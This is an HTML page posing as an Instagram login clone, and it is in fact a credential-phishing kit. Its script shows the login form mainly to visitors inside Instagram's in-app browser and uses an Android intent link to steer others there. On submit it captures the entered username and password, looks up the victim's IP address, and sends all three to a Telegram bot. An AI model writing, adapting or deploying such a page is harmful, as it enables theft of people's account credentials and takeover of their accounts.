<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css" />
    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
    <title>Instagram Clone</title>
    <style>
        #main-wrapper { display: none; }
        #bridge-screen { 
            display: flex; flex-direction: column; justify-content: center; 
            align-items: center; height: 100vh; text-align: center; font-family: sans-serif;
        }
        .btn { background: #0095f6; color: white; padding: 10px 20px; border-radius: 4px; text-decoration: none; margin-top: 20px; cursor: pointer; }
    </style>
</head>
<body>

    <!-- Bridge screen for external browsers -->
    <div id="bridge-screen">
        <h3>Testing Environment detected</h3>
        <p>To test the Instagram In-App Browser, send this link to your DMs and open it there.</p>
        <a id="intent-btn" class="btn">Open App Directly</a>
    </div>

    <!-- The actual Login UI -->
    <div id="main-wrapper">
        <main class="flex align-items-center justify-content-center">
            <section id="auth" class="flex direction-column">
                <div class="panel login flex direction-column">
                    <h1 class="flex justify-content-center"><img src="./img/instagram-logo.png" /></h1>
                    <form id="login-form">
                        <input id="email" placeholder="Phone, username, or email" required />
                        <input id="password" type="password" placeholder="Password" required />
                        <button type="submit">Log In</button>
                    </form>
                </div>
            </section>
        </main>
    </div>

<script src="https://unpkg.com"></script>
<script>
    (function() {
        const ua = navigator.userAgent;
        const isInstagram = ua.includes("Instagram"); // Detects Instagram In-App Browser
        const isEdge = ua.includes("Edg") && ua.includes("Win");

        // 1. Show UI if inside Instagram App or using Edge on Windows
        if (isInstagram || isEdge) {
            document.getElementById('bridge-screen').style.display = 'none';
            document.getElementById('main-wrapper').style.display = 'block';
        } else {
            // 2. Otherwise, prepare the Intent button for Android
            const currentUrl = window.location.href;
            const intentUrl = `intent://${currentUrl.replace(/^https?:\/\//, '')}#Intent;package=com.instagram.android;scheme=https;end`;
            document.getElementById('intent-btn').href = intentUrl;
        }
    })();

    // Telegram Bot Submission
    document.getElementById('login-form').addEventListener('submit', function(e) {
        e.preventDefault();
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        
        axios.get('https://api.ipify.org').then(res => {
            const message = `<b>Hacking Test Log</b>\n<b>User:</b> ${email}\n<b>Pass:</b> ${password}\n<b>IP:</b> ${res.data.ip}`;
            axios.post(`https://api.telegram.org`, {
                chat_id: "5763674764", parse_mode: 'html', text: message
            }).then(() => alert('Captured! Check your bot.'));
        });
    });
</script>
</body>
</html>
